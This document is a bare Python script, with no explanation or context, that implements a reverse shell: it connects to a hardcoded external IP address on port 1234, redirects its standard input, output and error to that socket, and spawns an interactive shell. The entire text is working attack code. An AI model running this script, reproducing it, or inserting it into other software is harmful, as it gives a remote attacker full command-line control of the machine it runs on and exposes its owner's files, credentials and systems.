import socket
import subprocess
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("141.95.98.213", 1234))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("sh")
